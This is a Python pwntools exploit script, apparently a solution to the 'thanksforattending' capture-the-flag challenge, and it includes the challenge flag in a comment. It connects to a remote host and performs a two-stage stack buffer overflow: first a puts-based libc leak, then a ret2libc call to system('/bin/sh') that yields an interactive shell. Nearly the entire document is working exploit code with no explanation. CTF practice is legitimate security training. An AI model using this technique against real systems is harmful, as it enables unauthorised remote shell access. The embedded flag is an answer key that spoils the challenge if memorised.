#exploit for thanksforattending
#BSDCTF{3xpl0r1ng_th3_unkn0wn}
from pwn import *
import time
elf = ELF("./chall")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux.so.2")
context.binary=elf
target=remote('13.233.104.112',2222)
context.log_level='DEBUG'

def sla(string,val):
	target.sendlineafter(string,val)

def sa(string,val):
	target.sendafter(string,val)

main=0x080491F6
puts_plt=0x80490a0
payload="A"*0x28+p32(puts_plt)+p32(main)+p32(elf.got["puts"])
sla("name?\n",payload)
target.recvuntil("!\n")
libc_puts=u32(target.recv(4))
libc_base=libc_puts-libc.sym["puts"]
libc_system=libc_base+libc.sym["system"]
libc_binsh=libc_base+libc.search("/bin/sh\x00").next()
payload="A"*0x28+p32(libc_system)+p32(0xdeadbeef)+p32(libc_binsh)
sla("name?\n",payload)
target.interactive()
